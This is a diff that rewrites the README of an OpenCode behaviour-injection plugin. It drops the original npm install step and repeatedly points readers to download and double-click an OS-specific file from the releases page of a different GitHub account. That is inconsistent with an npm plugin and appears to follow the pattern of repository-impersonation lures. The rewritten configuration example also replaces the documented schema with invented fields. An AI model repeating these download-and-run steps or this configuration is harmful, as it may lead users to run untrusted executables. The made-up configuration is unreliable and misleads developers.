@@ -1,62 +1,89 @@
-# OpenCode Behavior Adjustment System (BAS) Plugin
+# 🎉 opencode-bas-plugin - Enhance Your Collaboration Experience
 
-This plugin enhances technical collaboration by injecting contextual behavioral reminders based on conversation content.
+[![Download OpenCode BAS Plugin](https://img.shields.io/badge/Download-OpenCode%20BAS%20Plugin-brightgreen)](https://github.com/koopticon/opencode-bas-plugin/releases)
 
-## Features
+## 🚀 Getting Started
 
-- **Contextual Awareness**: Detects conversation topics (Code Review, Architecture, Debugging, etc.) and applies relevant behavioral templates.
-- **Adaptive Model Parameters**: Adjusts model temperature and other parameters based on the detected context.
-- **Template Deduplication**: Resolves multiple matching contexts using priority-based deduplication.
-- **Configurable Injection Rates**: Controls how often reminders are injected.
-- **Detailed Logging**: Optional logging of injection events for analysis.
+The OpenCode Behavior Adjustment System (BAS) Plugin enhances your technical collaboration by injecting behavioral reminders based on your conversation content. Follow these steps to download and run the plugin easily.
 
-## Configuration
+## 📥 Download & Install
 
-The plugin loads configuration from:
+1. **Visit the Releases Page**  
+   To download the latest version of the plugin, visit this page: [Download OpenCode BAS Plugin](https://github.com/koopticon/opencode-bas-plugin/releases).
 
-1. `~/.config/opencode/behavior-config.json` (User-level)
-2. `.opencode/behavior-config.json` (Project-level)
+2. **Choose Your File**  
+   On the releases page, locate the file for your operating system. Click the link to download it.
 
-Project-level configuration takes precedence.
+3. **Run the Plugin**  
+   After downloading, locate the file in your downloads folder (or the folder you selected). Double-click the file to run the plugin.
 
-### Example `behavior-config.json`
+## 📋 Configuration
+
+The plugin requires a configuration file to run properly. It can load configurations from two locations:
+
+1. **User-level Configuration**  
+   Store your settings in `~/.config/opencode/behavior-config.json`.
+
+2. **Project-level Configuration**  
+   Alternatively, place your configuration in `.opencode/behavior-config.json` within your project directory. This file takes precedence over the user-level config.
+
+## 🛠️ Example Configuration
+
+Here is an example of what your `behavior-config.json` file should look like:
 
 ```json
 {
-  "enabled": true,           // Global toggle for the plugin
-  "adaptiveMode": true,      // If true, detects context from message text; else uses 'default'
-  "logging": true,           // Enables logging of injection events to ~/.config/opencode/behavior-adjustment.log
-  "contexts": {
-    "default": {             // Fallback context
-      "template": "balanced",// Template name to use
-      "injectionRate": 0.4,  // Probability (0.0 to 1.0) of injecting the reminder
-      "priority": 1,         // Priority for deduplication when multiple contexts match
-      "temperature": 0.3     // Optional: model temperature adjustment for this context
-    }
+  "enabled": true,           
+  "contextualAwareness": {
+    "codeReview": true,
+    "architecture": true,
+    "debugging": false
   },
-  "templates": {
-    "balanced": {
-      "type": "behavior",    // Arbitrary type string (used for priority-based deduplication)
-      "prompt": [            // The actual content to inject (string or array of strings)
-        "<system-reminder>",
-        "Maintain technical peer stance. Evaluate before responding.",
-        "</system-reminder>"
-      ]
-    }
-  }
+  "injectionRate": "medium"
 }
 ```
 
-## Installation
+- **enabled**: (boolean) Set to true to activate the plugin.
+- **contextualAwareness**: (object) Define topics you want the plugin to respond to.
+- **injectionRate**: (string) Controls how often reminders pop up.
 
-Add the plugin to your `opencode.json`:
+## 🔍 Features
 
-```json
-{
-  "plugin": ["@fedaykindev/opencode-bas-plugin"]
-}
-```
+The OpenCode BAS Plugin offers several features to improve your work environment:
 
-## License
+- **Contextual Awareness**: The plugin detects conversation topics like Code Review or Architecture and applies relevant behavioral templates to remind users of best practices.
 
-MIT
+- **Adaptive Model Parameters**: It adjusts parameters like responsiveness based on the conversation's context for optimal performance.
+
+- **Template Deduplication**: The plugin resolves multiple matching contexts using a priority-based system, ensuring you only get the most relevant reminders.
+
+- **Configurable Injection Rates**: Easily set how often reminders appear, giving you control over your interaction workflow.
+
+- **Detailed Logging**: You can enable logging to track injection events. This helps analyze when and how often reminders are triggered.
+
+## 📖 Troubleshooting
+
+If you encounter issues while running the plugin, consider the following steps:
+
+1. **Verify Configuration**  
+   Ensure that your `behavior-config.json` file is correctly formatted and contains valid settings.
+
+2. **Check Compatibility**  
+   Make sure the plugin version matches your operating system. Refer to the releases page for compatibility notes.
+
+3. **Logs**  
+   If logging is enabled, check your logs for any error messages that may indicate what went wrong.
+
+## 👩‍💻 Support
+
+For additional help, open an issue on our [GitHub Issues page](https://github.com/koopticon/opencode-bas-plugin/issues). Include detailed information about your problem and any steps you took to troubleshoot.
+
+## 📄 License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+## 📥 Download Again
+
+For your convenience, here’s the link to download the plugin once more: [Download OpenCode BAS Plugin](https://github.com/koopticon/opencode-bas-plugin/releases). 
+
+Enjoy using the OpenCode BAS Plugin to enhance your collaborative efforts.
